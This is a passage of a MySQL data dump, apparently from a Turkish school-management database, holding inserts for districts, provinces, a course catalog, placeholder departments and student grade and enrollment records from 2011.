INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '896', '74', 'Amasra' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '897', '74', 'Kurucasile' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '898', '74', 'Ulus' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '899', '75', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '900', '75', 'Çildir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '901', '75', 'Damal' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '902', '75', 'Göle' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '903', '75', 'Hanak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '904', '75', 'Posof' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '905', '76', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '906', '76', 'Aralik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '907', '76', 'Karakoyunlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '908', '76', 'Tuzluca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '909', '77', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '910', '77', 'Altinova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '911', '77', 'Armutlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '912', '77', 'Cinarcik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '913', '77', 'Ciftlikkoy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '914', '77', 'Termal' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '915', '78', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '916', '78', 'Eflani' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '917', '78', 'Eskipazar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '918', '78', 'Ovacik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '919', '78', 'Safranbolu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '920', '78', 'Yenice' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '921', '79', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '922', '79', 'Elbeyli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '923', '79', 'Musabeyli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '924', '79', 'Polateli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '925', '80', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '926', '80', 'Bahçe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '927', '80', 'Hasanbeyli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '928', '80', 'Düziçi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '929', '80', 'Kadirli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '930', '80', 'Sunbas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '931', '80', 'Toprakkale' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '932', '81', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '933', '81', 'Akçakoca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '934', '81', 'Cumayeri' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '935', '81', 'Çilimli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '936', '81', 'Gölyaka' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '937', '81', 'Gümüsova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '938', '81', 'Kaynasli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '939', '81', 'Yigilca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '940', '00', 'Bilinmiyor' );
-- ---------------------------------------------------------


-- Dump data of "iller" ------------------------------------
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '00', 'Bilinmiyor' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '01', 'ADANA' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '02', 'Adiyaman' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '03', 'Afyon' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '04', 'Ağri' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '05', 'Amasya' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '06', 'Ankara' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '07', 'Antalya' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '08', 'Artvin' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '09', 'Aydin' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '10', 'Balikesir' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '11', 'Bilecik' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '12', 'Bingöl' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '13', 'Bitlis' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '14', 'Bolu' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '15', 'Burdur' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '16', 'Bursa' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '17', 'Çanakkale' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '18', 'Çankiri' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '19', 'Çorum' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '20', 'Denizlİ' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '21', 'Diyarbakir' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '22', 'Edirne' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '23', 'Elaziğ' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '24', 'Erzincan' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '25', 'Erzurum' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '26', 'Eskişehir' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '27', 'Gaziantep' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '28', 'Giresun' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '29', 'Gümüşhane' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '30', 'Hakkari' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '31', 'Hatay' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '32', 'Isparta' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '33', 'İçel' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '34', 'İstanbul' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '35', 'İzmir' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '36', 'Kars' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '37', 'Kastamonu' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '38', 'Kayserİ' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '39', 'Kirklareli' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '40', 'Kirşehir' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '41', 'Kocaeli' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '42', 'Konya' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '43', 'Kütahya' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '44', 'Malatya' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '45', 'Manisa' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '46', 'Kahramanmaraş' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '47', 'Mardin' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '48', 'Muğla' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '49', 'Muş' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '50', 'Nevşehir' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '51', 'Niğde' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '52', 'Ordu' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '53', 'Rize' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '54', 'Sakarya' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '55', 'Samsun' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '56', 'Siirt' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '57', 'Sinop' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '58', 'Sivas' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '59', 'Tekirdağ' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '60', 'Tokat' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '61', 'Trabzon' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '62', 'Tuncelİ' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '63', 'Şanliurfa' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '64', 'Uşak' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '65', 'Van' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '66', 'Yozgat' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '67', 'Zonguldak' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '68', 'Aksaray' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '69', 'Bayburt' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '70', 'Karaman' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '71', 'Kirikkale' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '72', 'Batman' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '73', 'Şirnak' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '74', 'Bartin' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '75', 'Ardahan' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '76', 'Iğdir' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '77', 'Yalova' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '78', 'Karabük' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '79', 'Kilis' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '80', 'Osmaniye' );
INSERT INTO `iller`(`ilKodu`,`ilAdi`) VALUES ( '81', 'Düzce' );
-- ---------------------------------------------------------


-- Dump data of "derskatalog" ------------------------------
INSERT INTO `derskatalog`(`dersNo`,`dersAdi`,`dersAlani`,`dersSaati`,`dersIcerik`) VALUES ( '001', 'Veritabanı Yönetim Sistemleri', '', '65', '' );
INSERT INTO `derskatalog`(`dersNo`,`dersAdi`,`dersAlani`,`dersSaati`,`dersIcerik`) VALUES ( '033', 'Web Programlama', '', '44', 'Bilinmiyoraaa' );
INSERT INTO `derskatalog`(`dersNo`,`dersAdi`,`dersAlani`,`dersSaati`,`dersIcerik`) VALUES ( '034', 'Nesne Yönelimli Programlama', NULL, NULL, 'NYPG' );
INSERT INTO `derskatalog`(`dersNo`,`dersAdi`,`dersAlani`,`dersSaati`,`dersIcerik`) VALUES ( '035', 'Bilgisayar Donanım', NULL, NULL, 'Bilinmiyor' );
INSERT INTO `derskatalog`(`dersNo`,`dersAdi`,`dersAlani`,`dersSaati`,`dersIcerik`) VALUES ( '036', 'Mantıksal Devreler', NULL, NULL, 'Bilinmiyor' );
INSERT INTO `derskatalog`(`dersNo`,`dersAdi`,`dersAlani`,`dersSaati`,`dersIcerik`) VALUES ( '045', 'Elektronik', '', '1200', '' );
-- ---------------------------------------------------------


-- Dump data of "bolumler" --------------------------------
INSERT INTO `bolumler`(`bolumNo`,`bolumAdi`,`adres`) VALUES ( '001', 'bolum A', NULL );
INSERT INTO `bolumler`(`bolumNo`,`bolumAdi`,`adres`) VALUES ( '002', 'bolum B', NULL );
INSERT INTO `bolumler`(`bolumNo`,`bolumAdi`,`adres`) VALUES ( '003', 'bolum C', '' );
INSERT INTO `bolumler`(`bolumNo`,`bolumAdi`,`adres`) VALUES ( '004', 'bolum D', NULL );
INSERT INTO `bolumler`(`bolumNo`,`bolumAdi`,`adres`) VALUES ( '005', 'bolum E', NULL );
INSERT INTO `bolumler`(`bolumNo`,`bolumAdi`,`adres`) VALUES ( '006', 'bolum F', NULL );
-- ---------------------------------------------------------


-- Dump data of "ogrencikayit" -----------------------------
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '12', '000036', '00000000001', '999', '999', '5', 'Başarısız', '99', '2011-05-17', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '21', '000036', '30682832620', '999', '999', '44', NULL, '99', '2011-05-24', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '41', '000042', '00000000001', '999', '999', '22', 'Başarısız', '99', '2011-08-19', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '57', '000042', '30682832620', '999', '999', '88', 'Başarılı', '99', '2011-08-21', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '67', '000001', '00000000001', '999', '999', '999', 'Girmedi', '99', '2011-08-21', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '94', '000039', '10000000012', '999', '999', '50', 'Başarısız', '99', '2011-08-21', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '99', '000001', '10000000010', '999', '999', '999', NULL, '99', '2011-08-21', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '100', '000001', '10000000005', '999', '999', '999', NULL, '99', '2011-08-21', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '163', '000046', '00000000061', '999', '999', '999', NULL, NULL, '2011-09-12', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '165', '000048', '00000000008', '999', '999', '999', NULL, NULL, '2011-09-12', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '166', '000048', '00000000041', '999', '999', '999', NULL, NULL, '2011-09-12', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '168', '000042', '00000000061', '999', '999', '111', 'Devamsız', NULL, '2011-09-12', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '245', '000048', '10000000010', '999', '999', '999', NULL, NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '246', '000048', '10000000009', '999', '999', '999', NULL, NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '272', '000038', '10000000008', '999', '999', '111', 'Devamsız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '274', '000038', '10000000007', '999', '999', '50', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '275', '000038', '10000000010', '999', '999', '70', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '277', '000038', '10000000005', '999', '999', '80', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '278', '000038', '10000000002', '999', '999', '90', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '279', '000038', '00000000001', '999', '999', '80', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '280', '000038', '00000000008', '999', '999', '10', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '285', '000038', '10000000001', '999', '999', '90', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '289', '000038', '00000000021', '999', '999', '20', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '290', '000038', '00000000062', '999', '999', '30', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '291', '000038', '00000000003', '999', '999', '40', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '293', '000038', '10000000012', '999', '999', '111', 'Devamsız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '294', '000038', '00000000004', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '297', '000038', '30682832620', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '299', '000038', '00000000009', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '300', '000038', '00000000041', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '306', '000038', '10000000006', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '307', '000050', '00000000061', '999', '999', '20', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '308', '000050', '10000000011', '999', '999', '30', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '309', '000050', '10000000008', '999', '999', '40', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '310', '000050', '10000000010', '999', '999', '72', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '311', '000050', '10000000004', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '312', '000050', '10000000006', '999', '999', '83', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '313', '000050', '10000000007', '999', '999', '40', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '315', '000050', '10000000003', '999', '999', '55', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '318', '000050', '10000000001', '999', '999', '99', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '319', '000050', '10000000002', '999', '999', '99', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '320', '000050', '00000000001', '999', '999', '88', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '321', '000050', '00000000008', '999', '999', '88', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '322', '000050', '00000000041', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '323', '000050', '00000000009', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '324', '000050', '00000000021', '999', '999', '88', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '325', '000050', '00000000062', '999', '999', '99', 'Başarılı', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '326', '000050', '30682832620', '999', '999', '999', 'Girmedi', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '327', '000050', '00000000003', '999', '999', '15', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
